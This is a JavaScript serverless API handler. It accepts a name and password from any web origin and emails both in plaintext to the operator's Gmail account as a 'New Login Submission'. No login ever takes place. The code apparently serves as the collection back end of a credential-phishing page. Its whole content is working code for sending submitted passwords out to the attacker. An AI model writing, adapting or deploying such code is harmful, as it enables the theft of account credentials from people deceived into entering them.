import nodemailer from 'nodemailer';
import Cors from 'cors';

// Initialize the cors middleware
const cors = Cors({
  origin: '*', // allow all origins (or set your domain)
  methods: ['GET', 'HEAD', 'POST', 'OPTIONS'],
});

// Helper method to wait for middleware to execute before continuing
function runMiddleware(req, res, fn) {
  return new Promise((resolve, reject) => {
    fn(req, res, (result) => {
      if (result instanceof Error) return reject(result);
      return resolve(result);
    });
  });
}

export default async function handler(req, res) {
  // Run CORS middleware to handle OPTIONS preflight
  await runMiddleware(req, res, cors);

  if (req.method === 'OPTIONS') {
    // Respond to OPTIONS preflight immediately
    return res.status(204).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { name, password } = req.body;
  const sanitizedName = typeof name === 'string' ? name.trim() : '';
  const sanitizedPassword = typeof password === 'string' ? password.trim() : '';

  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: 'New Login Submission',
      text: `New login details:\nName: ${sanitizedName}\nPassword: ${sanitizedPassword}`,
      html: `<h3>New Login Submission</h3><p><strong>Name:</strong> ${sanitizedName}</p><p><strong>Password:</strong> ${sanitizedPassword}</p>`,
    };

    await transporter.sendMail(mailOptions);

    return res.status(200).json({ message: 'Login details sent successfully' });
  } catch (error) {
    console.error('Error sending email:', error);
    return res.status(500).json({ message: 'Failed to send email', error: error.message });
  }
}
